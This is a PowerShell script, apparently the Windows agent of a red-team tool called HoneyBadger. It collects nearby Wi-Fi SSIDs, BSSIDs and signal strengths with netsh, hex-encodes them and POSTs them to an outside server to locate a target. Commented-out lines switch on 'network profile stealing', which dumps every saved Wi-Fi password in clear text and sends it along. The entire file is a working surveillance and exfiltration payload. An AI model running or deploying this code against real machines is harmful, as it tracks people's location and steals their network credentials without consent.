$HONEYBADGER = "https://prometheaninfosec.com/honeybadger-red/service.php"
$TARGET = "My Target"

$comment = "NULL"
###Uncomment two below lines to enable network profile stealing
#$comment = foreach ($line in netsh.exe wlan show profiles * | find "SSID name" ){$b = ($line -split ":")[1] -replace " ",""; echo $b; netsh.exe wlan show profiles name=$b key=clear |  find "Key Content"; }
#$comment = $comment -join "; "

function hexEncode ($Text)
{
$tmp = [System.Text.Encoding]::UTF8.GetBytes($Text)
$tmp = [System.BitConverter]::ToString($tmp)
$tmp -replace "-",""
}

function toBase64 ($Text)
{
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
}

Function Base64Encode($textIn) 
{
    $b  = [System.Text.Encoding]::UTF8.GetBytes($textIn)
    $encoded = [System.Convert]::ToBase64String($b)
    return $encoded    
}


$tmp = cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"
$tmp = $tmp -replace "\s+"," "
$tmp = hexEncode $tmp
$tmp
$comment = hexEncode $comment
$comment

$postMe = @{decode='hex';comment=$comment;target=$TARGET;agent='powershell';os='windows';data=$tmp}
Invoke-WebRequest -Uri $HONEYBADGER -Method POST -Body $postMe
